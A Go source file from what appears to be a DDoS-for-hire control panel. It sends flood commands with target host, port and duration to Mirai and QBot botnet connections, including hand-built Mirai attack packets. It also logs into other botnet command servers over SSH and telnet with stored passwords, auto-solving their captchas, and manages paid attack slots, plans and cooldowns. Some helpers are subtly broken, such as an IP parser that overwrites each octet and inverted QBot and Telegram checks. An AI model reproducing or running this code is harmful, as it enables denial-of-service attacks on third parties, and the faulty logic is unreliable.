package database

import (
	"Manager/assets"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"github.com/common-nighthawk/go-figure"
	"github.com/fsnotify/fsnotify"
	"github.com/gtuk/discordwebhook"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func CheckError(err error) bool {
	if err != nil {
		Warning(err)
		return true
	}
	return false
}

func GetMethod(method string) assets.Method {
	for _, m := range Methods.Methods {
		if m.Name == method {
			return m
		}
	}
	return assets.Method{}
}

func CheckWhitelist(host string) bool {
	if len(Config.Whitelist) < 1 {
		return true
	} else {
		for _, v := range Config.Whitelist {
			if strings.Contains(host, v) {
				return true
			}
		}
	}
	return false
}

func CheckBlacklist(host string) bool {
	for _, target := range Config.Blacklist {
		if strings.Contains(host, target) {
			return true
		}
		regex := regexp.MustCompile(`^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})-(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$`)
		if regex.MatchString(target) {
			if IPInRange(host, target) {
				return true
			}
		}
	}
	return false
}

func IPInRange(ip string, range_ string) bool {
	ips := strings.Split(range_, "-")
	start := IP2int(ips[0])
	end := IP2int(ips[1])
	ip_ := IP2int(ip)
	return ip_ >= start && ip_ <= end
}

func IP2int(ip string) uint32 {
	var num uint32
	_, err := fmt.Sscanf(ip, "%d.%d.%d.%d", &num, &num, &num, &num)
	CheckError(err)
	return num
}

func SendLog(msg string) {
	if Config.DiscordWeb == "" {
		return
	}
	var username = "API-Manager " + Version
	var content = ""
	var title = "API-Manager"
	var color = "5763719"

	embed := discordwebhook.Embed{
		Title:       &title,
		Description: &msg,
		Color:       &color,
	}

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
		Embeds:   &[]discordwebhook.Embed{embed},
	}

	err := discordwebhook.SendMessage(Config.DiscordWeb, message)
	if err != nil {
		Warning("Error sending discord message")
	}

	if Config.TelegramBot == "" || Config.TelegramChat == "" {
		tgbot := "https://api.telegram.org/bot" + Config.TelegramBot + "/sendMessage?chat_id=" + Config.TelegramChat + "&text="
		msg = strings.NewReplacer(" ", "%20", "\r\n", "%0A").Replace(msg)
		_, err = http.Get(tgbot + msg)
		if err != nil {
			Warning("Error sending telegram message")
		}
	}
}

func GetActiveCons() int {
	globalCons := 0
	for _, v := range Concurrents.Running {
		if (v.Con) > 0 {
			globalCons = globalCons + v.Con
		}
	}
	return globalCons
}

func GetActiveConsUser(username string) int {
	globalCons := 0
	for _, v := range Concurrents.Running {
		if (v.Con) > 0 && v.User.Username == username {
			globalCons = globalCons + v.Con
		}
	}
	return globalCons
}

func CheckDuplicate(ip string) bool {
	if BlockedIPs[ip] {
		return true
	}
	for _, bot := range Qbots {
		if strings.Split(bot.RemoteAddr().String(), ":")[0] == ip && !Config.QBot.Dupes {
			Warning("[BLOCKED] Blocked Bot Connection")
			BlockedIPs[ip] = true
			return true
		}
	}

	for _, bot := range Mirai {
		if strings.Split(bot.RemoteAddr().String(), ":")[0] == ip && !Config.Mirai.Dupes {
			fmt.Println("[BLOCKED] Blocked Bot Connection")
			BlockedIPs[ip] = true
			return true
		}
	}

	return false
}

func GenerateKey() string {
	rand.Seed(time.Now().UnixNano())
	chars := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	length := 15
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	str := b.String()
	return str
}

func DetectHTML(web string) bool {
	// if string contains any of these, it's probably HTML
	html := []string{"<html>", "<head>", "<title>", "<body>", "<h1>", "<div>", "<p>", "<a href", "<!--", "<script>", "<table>", "<form>", "<input>", "<br>", "<hr>", "<!DOCTYPE html>"}
	for _, v := range html {
		if strings.Contains(web, v) {
			return true
		}
	}
	return false
}

func CheckNets() {
	for _, con := range Connected {
		out := make([]byte, 1024)
		_, err2 := (*con.Stdout).Read(out)
		if err2 != nil {
			name := con.Cmd.Args[3]
			name = strings.Split(name, "@")[1]
			SendLog("C2 with IP: " + name + " lost!")
			(*con.Cmd).Process.Kill()
			Connected = Remove(Connected, con)
			continue
		}
	}
}

func Remove(connected []Cm, con Cm) []Cm {
	for i, v := range connected {
		if v == con {
			return append(connected[:i], connected[i+1:]...)
		}
	}
	return connected
}
func ConnectNets() bool {
	if len(Nets.SSHs) > 0 {
		for _, sh := range Nets.SSHs {
			for _, value := range sh {
				if value.Captcha == "SSN" || value.Captcha == "Succubus" {
					h := strings.Split(value.Host, ":")[0]
					p := strings.Split(value.Host, ":")[1]
					cmd := exec.Command("plink", "-batch", "-ssh", value.Username+"@"+h, "-pw", value.Password, "-P", p)

					for _, con := range Connected {
						if con.Cmd.Args[3] == cmd.Args[3] {
							return false
						}
					}

					time.Sleep(time.Duration(value.Delay) * time.Second)

					stdin, err := cmd.StdinPipe()
					if err != nil {
						Warning(err, " on getting stdin")
						continue
					}

					stdout, err := cmd.StdoutPipe()
					if err != nil {
						Warning(err, " on getting stdout")
						continue
					}

					err = cmd.Start()
					if err != nil {
						Warning(err, " on starting plink")
						continue
					}

					if value.ToS != "" {
						stdin.Write([]byte(value.ToS + "\r\n"))
						time.Sleep(time.Duration(value.LoginDelay) * time.Second)
					}

					time.Sleep(time.Duration(value.Delay) * time.Second)

					output := make([]byte, 2024)
					n, err := stdout.Read(output)
					if err != nil {
						return false
					}
					fmt.Println(string(output[:n]))

					fmt.Print("Captcha: ")
					var captcha string
					fmt.Scanln(&captcha)
					stdin.Write([]byte(captcha + "\r\n"))
					time.Sleep(time.Duration(value.LoginDelay) * time.Second)
					Connected = append(Connected, Cm{cmd, &stdin, &stdout})
					time.Sleep(time.Duration(value.Delay) * time.Second)
					if Config.Debug {
						out := make([]byte, 2024)
						n, err = stdout.Read(out)
						if err != nil {
							Warning(err, " on reading output")
							break
						}
						fmt.Println(string(out[:n]))
						fmt.Println("plink", "-batch", "-ssh", value.Username+"@"+h, "-pw", value.Password, "-P", p)
					}
				} else {
					continue
				}
			}
		}
	}
	return true
}
func SendAPIs(method assets.Method, host string, port int, duration int, user assets.User) {
	if len(method.Gateway.APIs) > 0 {
		for _, api := range method.Gateway.APIs {
			go func(_api string, _host string, _port int, _duration int, _user assets.User) {
				_url := strings.NewReplacer("[host]", _host, "[port]", strconv.Itoa(_port), "[time]", strconv.Itoa(_duration), "[threads]", strconv.Itoa(_user.Threads)).Replace(_api)
				client := http.Client{
					Timeout: 2 * time.Minute,
				}
				resp, err := client.Get(_url)
				if CheckError(err) {
					return
				}
				defer func(Body io.ReadCloser) {
					err := Body.Close()
					CheckError(err)
				}(resp.Body)
				body, err := io.ReadAll(resp.Body)
				if CheckError(err) {
					return
				}
				if Config.Debug {
					Info(fmt.Sprintf("Sent API request to %s, got response %s", _url, string(body)))
					SendLog(fmt.Sprintf("**API REQUEST SENT**\r\n\r\n**URL**: \r\n%s\r\n**Response**: \r\n%s", _url, string(body)))
				}
				url := strings.Split(_url, "/")[2]
				SendLog("Successfully sent to " + url)
			}(api, host, port, duration, user)
		}
	}
}

func SendServers(method assets.Method, host string, port int, duration int, user assets.User) {
	if len(Servers.Servers) > 0 {
		for _, server := range Servers.Servers {
			for name, value := range server {
				for _, m := range value.Methods {
					if m == method.Name || m == "*" {
						for _, c := range method.Gateway.Command {
							c := c
							go func(_host string, _port int, _duration int, _user assets.User) {
								h := strings.Split(value.Host, ":")[0]
								p := strings.Split(value.Host, ":")[1]
								cmd := exec.Command("plink", "-batch", "-ssh", value.Username+"@"+h, "-pw", value.Password, "-P", p)

								stdin, err := cmd.StdinPipe()
								if err != nil {
									Warning(err, " on getting stdin")
									return
								}

								defer stdin.Close()

								stdout, err := cmd.StdoutPipe()
								if err != nil {
									Warning(err, " on getting stdout")
									return
								}
								defer stdout.Close()

								err = cmd.Start()
								if err != nil {
									Warning(err, " on starting plink")
									return
								}

								time.Sleep(500 * time.Millisecond)

								for x := 0; x < c.Count; x++ {
									_cmd := strings.NewReplacer("[host]", _host, "[port]", strconv.Itoa(_port), "[time]", strconv.Itoa(_duration), "[threads]", strconv.Itoa(user.Threads)).Replace(c.Cmd)
									_, err = io.WriteString(stdin, _cmd+"\r\n")
									if err != nil {
										Warning(err, " on writing to stdin")
										return
									}
								}

								var out1 []byte
								_, err = stdout.Read(out1)
								if err != nil {
									Warning(err, " on reading output 2")
									return
								}
								if Config.Debug {
									fmt.Println(string(out1))
								}
							}(host, port, duration, user)
						}

						fmt.Println("Succesfully sent to " + name)
						SendLog("Succesfully sent to " + name)
					}
				}
			}
		}
	}
}

func SendNets(method assets.Method, host string, port int, duration int, user assets.User) {
	go func() {
		if len(Nets.SSHs) > 0 {
			for _, sh := range Nets.SSHs {
				for _, value := range sh {
					for _, m := range value.Methods {
						if m == method.Name || m == "*" {
							for _, _cmd := range method.Gateway.SSHCmd {
								if _cmd[value.Name] != "" {
									if value.Captcha != "SSN" && value.Captcha != "Succubus" {
										h := strings.Split(value.Host, ":")[0]
										p := strings.Split(value.Host, ":")[1]
										cmd := exec.Command("plink", "-batch", "-ssh", value.Username+"@"+h, "-pw", value.Password, "-P", p)
										if Config.Debug {
											fmt.Println("plink", "-batch", "-ssh", value.Username+"@"+h, "-pw", value.Password, "-P", p)
										}

										time.Sleep(time.Duration(value.Delay) * time.Second)

										stdin, err := cmd.StdinPipe()
										if err != nil {
											Warning(err, " on getting stdin")
											break
										}

										defer stdin.Close()

										stdout, err := cmd.StdoutPipe()
										if err != nil {
											Warning(err, " on getting stdout")
											break
										}
										defer stdout.Close()

										err = cmd.Start()
										if err != nil {
											Warning(err, " on starting plink")
											break
										}

										if value.ToS != "" {
											stdin.Write([]byte(value.ToS + "\r\n"))
											time.Sleep(time.Duration(value.LoginDelay) * time.Second)
										}

										time.Sleep(time.Duration(value.Delay) * time.Second)

										if value.Captcha == "noviask" {
											output := make([]byte, 4096)
											n, err := stdout.Read(output)
											if err != nil {
												Warning(err, " on reading output")
												break
											}

											newout := strings.Replace(string(output[:n]), "\r\n", "", 4)
											newout = strings.Split(newout, "\r\n")[0]
											newout = strings.Replace(newout, " ", "", -1)

											if Config.Debug {
												fmt.Println("Captcha: " + newout)
											}
											_now := time.Now()
											var answer string

											for x := 10; x <= 99; x++ {
												fig := figure.NewFigure(strconv.Itoa(x), "slant", true).String()
												_out := strings.Replace(fig, "\n", "", -1)
												_out = strings.Replace(_out, " ", "", -1)
												if newout == _out || strings.Contains(newout, _out) {
													answer = strconv.Itoa(x)
													fmt.Println("Found answer: " + answer)
													break
												}
											}

											if Config.Debug {
												fmt.Println("Time taken: " + time.Since(_now).String())
											}

											_, err = stdin.Write([]byte(answer + "\r\n"))

											if err != nil {
												Warning(err, " on Enter Captcha")
												break
											}
										} else if value.Captcha == "ssn-math" {
											output := make([]byte, 1000)
											n, err := stdout.Read(output)
											if err != nil {
												Warning(err, " on reading output")
												break
											}
											fmt.Println(string(output[:n]))
											out := strings.Split(string(output[:n]), ":")[1]
											out = strings.Replace(out, " ", "", -1)
											fmt.Println(out)
										}

										time.Sleep(time.Duration(value.Delay) * time.Second)
										dur := strconv.Itoa(duration)
										pay := strings.NewReplacer("[host]", host, "[port]", strconv.Itoa(port), "[time]", dur, "[threads]", strconv.Itoa(user.Threads)).Replace(_cmd[value.Name])
										_, err = stdin.Write([]byte(pay + "\r\n"))
										if err != nil {
											Warning(err, " on sending attack")
											break
										}

										if Config.Debug {
											time.Sleep(5 * time.Second)
											out1 := make([]byte, 4096)
											_, err := stdout.Read(out1)
											if err != nil {
												Warning(err, " on reading output 2")
												break
											}

											fmt.Println(string(out1))
										}

										err = cmd.Process.Kill()
										if err != nil {
											Warning(err, " on CMD Kill")
											break
										}
										fmt.Println("Successfully sent to " + value.Name)
										SendLog("Successfully sent to " + value.Name)
									} else {
										for _, con := range Connected {
											time.Sleep(time.Duration(value.Delay) * time.Second)
											dur := strconv.Itoa(duration)
											pay := strings.NewReplacer("[host]", host, "[port]", strconv.Itoa(port), "[time]", dur, "[threads]", strconv.Itoa(user.Threads)).Replace(_cmd[value.Name])
											(*con.Stdin).Write([]byte(pay + "\r\n"))
											if err != nil {
												Warning(err, " on sending attack")
												break
											}

											if Config.Debug {
												time.Sleep(1 * time.Second)
												out := make([]byte, 4096)
												_, err := (*con.Stdout).Read(out)
												if err != nil {
													Warning(err, " on reading output 2")
													break
												}
												fmt.Println(string(out))
											}
											if err != nil {
												Warning(err, " on closing stdin")
												return
											}
											if err != nil {
												Warning(err, " on closing stdout")
												return
											}
											fmt.Println("Successfully sent to " + value.Name)
											SendLog("Successfully sent to " + value.Name)
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}()
	go func() {
		if len(Nets.Telnets) > 0 {
			for _, tel := range Nets.Telnets {
				for _, value := range tel {
					for _, m := range value.Methods {
						if m == method.Name || m == "*" {
							for _, cmd := range method.Gateway.TelnetCmd {
								if cmd[value.Name] != "" {
									var err error
									conn, err := net.DialTimeout("tcp", value.Host, 5*time.Minute)
									if err != nil {
										Warning("Failed to connect to " + value.Host)
										break
									}
									defer func(conn net.Conn) {
										err := conn.Close()
										if err != nil {
											Warning("Failed to close connection to " + value.Host)
											return
										}
									}(conn)

									test := make([]byte, 99999909)
									conn.Write([]byte("\r\n"))
									time.Sleep(time.Duration(value.LoginDelay) * time.Second)
									conn.Write([]byte(value.Username + "\r\n"))
									time.Sleep(time.Duration(value.LoginDelay) * time.Second)
									conn.Write([]byte(value.Password + "\r\n"))
									time.Sleep(time.Duration(value.Delay) * time.Second)
									if value.ToS != "" {
										conn.Write([]byte(value.ToS + "\r\n"))
										time.Sleep(time.Duration(value.LoginDelay) * time.Second)
									}
									time.Sleep(time.Duration(value.LoginDelay) * time.Second)
									dur := strconv.Itoa(duration)
									pay := strings.NewReplacer("[host]", host, "[port]", strconv.Itoa(port), "[time]", dur, "[threads]", strconv.Itoa(user.Threads)).Replace(cmd[value.Name])
									conn.Write([]byte(pay + "\r\n"))
									time.Sleep(5 * time.Second)
									conn.Read(test)
									fmt.Println("Successfully sent to " + value.Name)
									SendLog("Successfully sent to " + value.Name)
								}
							}
						}
					}
				}
			}
		}
	}()

}

func SendQbots(method assets.Method, host string, port string, duration string, user assets.User) {
	if len(Qbots) == 0 {
		qbotcmd := strings.NewReplacer("[host]", host, "[port]", port, "[time]", fmt.Sprint(duration), "[threads]", strconv.Itoa(user.Threads)).Replace(method.Gateway.Qbot.Command)
		for _, qbot := range Qbots {
			go func(qbot net.Conn) {
				_, err := qbot.Write([]byte("\r\n" + qbotcmd + "\r\n"))
				CheckError(err)
			}(qbot)
		}
	}
}

func SendMirai(method assets.Method, host string, port string, duration string) {
	if len(Mirai) > 0 {
		buf := make([]byte, 0)
		var tmp []byte
		tmp = make([]byte, 4)
		dur, _ := strconv.ParseUint(duration, 10, 32)
		binary.BigEndian.PutUint32(tmp, uint32(dur))
		buf = append(buf, tmp...)
		buf = append(buf, byte(method.Gateway.Mirai.MethodFlag))
		buf = append(buf, byte(1))
		tmp = make([]byte, 5)
		strbuf := strings.Split(host, ".")
		for i, v := range strbuf {
			val, _ := strconv.ParseUint(v, 10, 8)
			tmp[i] = byte(val)
		}
		tmp[4] = 32
		buf = append(buf, tmp...)
		buf = append(buf, byte(1))
		tmp = make([]byte, 2)
		tmp[0] = uint8(method.Gateway.Mirai.PortFlag)
		strbaf := []byte(port)
		tmp[1] = uint8(len(strbaf))
		tmp = append(tmp, strbaf...)
		buf = append(buf, tmp...)
		tmp = make([]byte, 2)
		binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
		buf = append(tmp, buf...)
		for _, mirai := range Mirai {
			go func(mirai net.Conn) {
				_, err := mirai.Write(buf)
				CheckError(err)
			}(mirai)
		}
	}
}

func MethodSlotsFull(method assets.Method) bool {
	count := 0
	now := time.Now().Format("02-01-2006 15:04:05")
	for _, m := range Attacks {
		end, err := time.Parse("02-01-2006 15:04:05", m.End)
		CheckError(err)
		_now, err := time.Parse("02-01-2006 15:04:05", now)
		CheckError(err)
		if end.After(_now) && m.Method == method.Name {
			count++
		}
	}
	if count >= method.Slots {
		return true
	} else {
		return false
	}
}

func GetServerIP() string {
	resp, err := http.Get("https://api.ipify.org/")
	if CheckError(err) {
		return ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if CheckError(err) {
		return ""
	}
	return string(body)
}
func GetLoad() float64 {
	if GetActiveCons() == 0 {
		return 0
	}
	return float64(GetActiveCons()) / float64(Config.MaxCons) * 100
}

func CheckExpiry(username string) bool {
	_user := GetUser(username)
	now := time.Now()
	date, _ := time.Parse("02-01-2006", now.Format("02-01-2006"))
	expiry, _ := time.Parse("02-01-2006", _user.Expiry)
	if expiry.Before(date) {
		return true
	}
	return false
}

func CheckPlan(plan string, plans []string) bool {
	if strings.ToLower(plan) == "admin" {
		return true
	}
	for _, v := range plans {
		if v == plan {
			return true
		}
	}
	return false
}

func CheckIP(domain string) bool {
	regex := regexp.MustCompile(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`)
	if regex.MatchString(domain) {
		return true
	}
	return false
}

func GetIPInfo(IP string) assets.IPInfo {
	url := "https://ipinfo.io/" + IP + "?token=" + Config.IPInfo
	resp, err := http.Get(url)
	if CheckError(err) {
		return assets.IPInfo{}
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		CheckError(err)
	}(resp.Body)
	body, err := io.ReadAll(resp.Body)
	if CheckError(err) {
		return assets.IPInfo{}
	}
	ipinfo := assets.IPInfo{}
	err = json.Unmarshal(body, &ipinfo)
	if CheckError(err) {
		return assets.IPInfo{}
	}
	return ipinfo
}

func CheckASN(ip string, asn []string) bool {
	ASN := strings.Split(GetIPInfo(ip).Org, " ")[0]
	for _, v := range asn {
		if v == ASN {
			return true
		}
	}
	return false
}

func StartCooldown(user assets.User) {
	user.HasCooldown = true
	time.Sleep(time.Duration(user.Cooldown) * time.Second)
	user.HasCooldown = false
	return
}

func CheckChars(text string) bool {
	chars := []string{";", " ", "'", "&", "*", "|", "<", ">", "$", "\\", "/", "@", "%", "."}
	for _, v := range chars {
		if strings.Contains(text, v) {
			return true
		}
	}
	return false
}

func CheckInt(s string) bool {
	_, err := strconv.Atoi(s)
	return err == nil
}

func WatchFiles() {
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		log.Fatal(err)
	}
	defer watcher.Close()

	methodsPath := filepath.Join("config", "methods.json")
	if err := watcher.Add(methodsPath); err != nil {
		log.Fatal(err)
	}

	netsPath := filepath.Join("config", "nets.json")
	if err := watcher.Add(netsPath); err != nil {
		log.Fatal(err)
	}

	serversPath := filepath.Join("config", "servers.json")
	if err := watcher.Add(serversPath); err != nil {
		log.Fatal(err)
	}
	Info("Watching for changes in the config folder...")
	for {
		select {
		case event, ok := <-watcher.Events:
			if !ok {
				return
			}

			if event.Op&fsnotify.Write == fsnotify.Write {
				switch event.Name {
				case methodsPath:
					Info("methods.json has been modified.")
					LoadMethods()
				case netsPath:
					Info("methods.json has been modified.")
					LoadNets()
				case serversPath:
					Info("methods.json has been modified.")
					LoadServers()
				}
			}

		case err, ok := <-watcher.Errors:
			if !ok {
				return
			}
			log.Println("Error:", err)
		}
	}
}
